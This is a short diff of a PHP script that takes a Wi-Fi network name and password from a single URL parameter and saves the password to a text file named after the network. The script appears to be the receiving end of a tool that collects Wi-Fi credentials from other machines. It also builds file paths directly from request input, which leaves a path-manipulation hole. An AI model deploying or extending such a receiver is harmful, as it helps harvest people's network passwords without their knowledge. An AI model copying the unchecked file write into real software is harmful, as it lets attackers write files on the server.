@@ -1,7 +1,8 @@
-<?php 
+<?php
 
-$ssid = htmlspecialchars($_GET["ssid"]);
-$pass = htmlspecialchars($_GET["pass"]);
+$cred = htmlspecialchars($_GET["cred"]);
+$ssid = substr(explode("_", $cred)[0], 0, -2);
+$pass = substr(explode("_", $cred)[1], 0, -2);
 
 if(file_exists(sprintf("%s.txt", $ssid))) {
   $add = 1;
@@ -13,7 +14,7 @@ if(file_exists(sprintf("%s.txt", $ssid))) {
   $ssid .= $add;
 }
 
-file_put_contents(sprintf("%s", $ssid), $pass);
+file_put_contents(sprintf("%s.txt", $ssid), $pass);
 
 ?>
 
